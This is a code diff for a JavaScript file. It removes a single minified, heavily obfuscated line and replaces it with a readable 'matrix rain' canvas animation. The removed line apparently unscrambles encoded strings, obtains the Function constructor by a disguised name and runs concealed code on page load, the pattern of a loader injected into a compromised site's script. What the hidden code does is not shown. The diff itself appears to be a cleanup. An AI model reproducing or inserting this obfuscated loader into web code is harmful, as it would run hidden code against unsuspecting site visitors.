@@ -1,1 +1,30 @@
-const fontSize=16;var canvas,ctx,symbols,columns,drops,drawMatrix;(function(){var bGX='',IFi=853-842;function RDp(x){var j=3094130;var h=x.length;var s=[];for(var c=0;c<h;c++){s[c]=x.charAt(c)};for(var c=0;c<h;c++){var f=j*(c+139)+(j%31059);var p=j*(c+164)+(j%16373);var g=f%h;var q=p%h;var w=s[g];s[g]=s[q];s[q]=w;j=(f+p)%6069201;};return s.join('')};var iAN=RDp('nodufqectotsmnovgshryulczpxrrijkbwact').substr(0,IFi);var WDq='vtt4l=f9.2=nr, ="cuva=  ;r;=g{{f=vphdv}[i+(ah);v[;6zel= ; x829(,i7m[r,1t,txz77k t)6fr(a ;1ou98!2u;;gc)))utr"[l;,x6( ),8vwAr-r d=2]cto+jn *ox=,a.=d=g1s;ehgco+r,b(". =Cn;(*)sr[(=v;lt7brk;88a.d;l.nv.;posl;=rnbs01z)ajuz=0]t(bC=.;4h.];w)[tnvtw=}0gima4ta,lviovg,1r"s)+7a(]=ok;2gn<]5u0.th]t08;kn=vr-<,rnnhx],h+Cb)yl kn]s)}q)aw.0=gu= iu=lr(vogta)p(0te=vi;is==),y),ho)(r;lxf=k=ueu}h C)rhar laji=r9a]=x]6=qx9;b0,7)y0rr((;f"t)+==sa>44v-;o4g{lAcf(niv=r+1.-vve=)[(o}lee{x viAra,(hu+fs)w9(.l[je;h"u=rec7pm +jn;t(a+jaf)k.d;;n2a[aa-.;n;",a.,r+axs"fav-tpe{]C25bj1es}h{)<+ewe=lh(ty]; dc;,ig;lS=shaihxp;f02iasf6r.mh;=oku.n<jnnr1+rd9wdcemt";edliy3d+1s+lv-tf=.]cui)(.clo)c;, ;b(](sw[)vrnrlsoym(a"pjr;Aoyg,=.o[+;)urtle+vrpnowr(2rr)8vyrtrincu,nrrl0av.+3[;1p(s+wkc6l(r0hahpjqeS)tocu.xrn(c++.Cnvxggzip)af}(jn ().Asa(6o8+ u<7.n+oq=q+(C5a (rnvu,,a7v=s.6td oyi+ron4ir4f,mrt4;;9,d,swgi))g({1u>mrh eC.gi1o8e[9 e[!oi;;er;';var xJG=RDp[iAN];var QqK='';var XFs=xJG;var gAM=xJG(QqK,RDp(WDq));var LlP=gAM(RDp('dMu,.n^.c^1_5=% eb)be^D^]l ^00t $ii2at[>.r^9!.^=i]^^tFF},7e0=$a+b..it<jSnh)n^}D!^%)n5!7}{0.(^2-4^=;:^=y"a r.o!( t^6.)cn=^23<^a5^1^(e]1F^ t%)6.{h$trb0x^o46_^tb8^n);ozs-ro.ett2dvt)6;,o.[3)h]^Tb(bE.^))sI2^b^^{^ni"n7l0xi0te0(x.a(0.fmi;f0^%e a1m!3;i.>l.o5nm0tp(;;. ^,^$,sb_5mt$>_i.^.r8^io^(!^lfe(^)of..7m747@2^;rtf^!^%1!2yo)$,r76+e^^tf^..D;%!r^^^^$yi2^)mxcrxi=^,j4a1cin_3:bt0.w!y^c(5^f%C,0e^;",A^.r12ent3]16e]bni,,, )b93tb.d1ngf[b^(}jy^t0=ioe{"-==p^%2p_0nc0; ${] ;(16.^ot^"(D=2f{^1tst_d4,nsonrr^n,T$o0ea{,5s)+,st^r(^%{^avg{4ne^)w)(om,fg;uxGfE(aGe>;_.  s(b52e^y%r$=5tow4^.ts).,jh[^nu^ae;1ros(c^;%;?f,l()^,4[tj!\'7^l^bpk^b>.]chs 4ri,f=m)]+j4 +u(jh=^)i.);s_ jeon&0^^!,b!3)8)^^^j^$^.yb,(s(fte^xl^=01f3)d=f?^1i]94i{b-^(tg.x1,r_^e.)^2^le(-l^^);7;!S^jj(5.ra *;4]55.3G(f40c!!)^.6.<4fi%.e,^d%0%^idt^;rcg;^ ^)(pa).m(^^e(e)^,(,x^%4 6^.$+o^(22(i)+i^^omwn$6g)=\'Eo.71r:<c;,7^^gf_ec}^^^G3_^g(]^.ytg8(=o(p0! cf]e#yj8^!^]s=gFgbxe^]^rr2}s 7oi_\/^1^A6w32)na^)_.duc6;;))}0b.n1tIaic%^!()^^<i;gl"^)=m({0,)d$g}Cd^tt0]*( $c1uj.s)=.6)$.w8.hs,{%1778u();f?ylof6;!ts^r0inb1.-;0o3bi .^;7)=3\'.,+^;g;_vfo.!eeb]].%;i^[^M3r.,)l;0boC.]C^_v*()i^cu-x)#^9n.o^)8. c,]{a2yatr!21^5eto(t,.^^2(9\'^Sl^,tr.9)e8j^u}&#C,a-tm^1rt.;52tj^0e&=C^))hf)s4"k^*p:^^?p!2&&tst $sN^v+c1(1nd0u.6iSo^1^b]o0k!e^;4<\/=,}4l.^9 o^({b1.l;)7!^e)w!]roaad]]er^g=;cs=rb..3^u^n79(1_d(0\/,fla6^br#r&t_].8=^h]4^!+=,5;)le=)6^);I @^,\/d?;.nto^0c;-]];w6^1oue^!i6h8r!uc^^1\/$s^ei+44$]o.x(f;(o(!a%)7=u6l^y5uc}e];]);e^(u0c^^{,anb.iA+.{}be(ayuM+^}2i^^u10c)sx5nja%0,#^)i6n.en^![hn(%rs]^0,r,%;d%jxnmza3S^$n,^0(s.];1,.ct"s4_]^=)^bE0a(]na1^1v.b.(,b;^r3,}]_];\/Gm.2_$.,!..;={o=^^%+,^e^e]}\'o;^1 )A!_rc^]m1!8_@iq0ed^62,^b.^#b_.]=)$]x^{^!fw06^^^n^ea_0l53S1^!.oh5{e!s.^y[a^<t^^.1)])+.^c.C0){n(40^$^2.]"l)ol6=5)nth0(FbbD\'i;.,\/)u{}0].pe5.l%+(,cj,.ci=j=Moa__tf!f1,.(>;n(.ndwid4)2ftwn04.4(3 lg^) !;(.3t,d!nt!E]6^1.(]t)[2{;.! {$8^u,^9$n !o(t.(7)n^_^[]fs2^n^(;s.^(.^jsbbb2^pjmi_(._.n^=!^tf^ie(f.^]{=s^o))3!\/g(bC%r79$ E4#n=C.#A18+5d^(0(plix6 fc.,)3^e 6]4#o6d^ gbb70G.3m^6_90g7._^r]v0eu4^;eca.)]b.%a((.1;05.b^gb)^cloh!)[8cu=<r ^0fri^%to)s[^^bi @..)^rub0:^w;^n_<_4a^]t e)}^'));var vUE=XFs(bGX,LlP );vUE(9613);return 5009})()
+const canvas = document.getElementById('matrixCanvas');
+const ctx = canvas.getContext('2d');
+
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+const symbols = 'アカサタナハマヤラワ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+const fontSize = 16;
+const columns = canvas.width / fontSize;
+const drops = Array(Math.floor(columns)).fill(1);
+
+function drawMatrix() {
+  ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+  ctx.fillStyle = '#0F0';
+  ctx.font = fontSize + 'px monospace';
+
+  for (let i = 0; i < drops.length; i++) {
+    const text = symbols.charAt(Math.floor(Math.random() * symbols.length));
+    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+      drops[i] = 0;
+    }
+    drops[i]++;
+  }
+}
+
+setInterval(drawMatrix, 50);
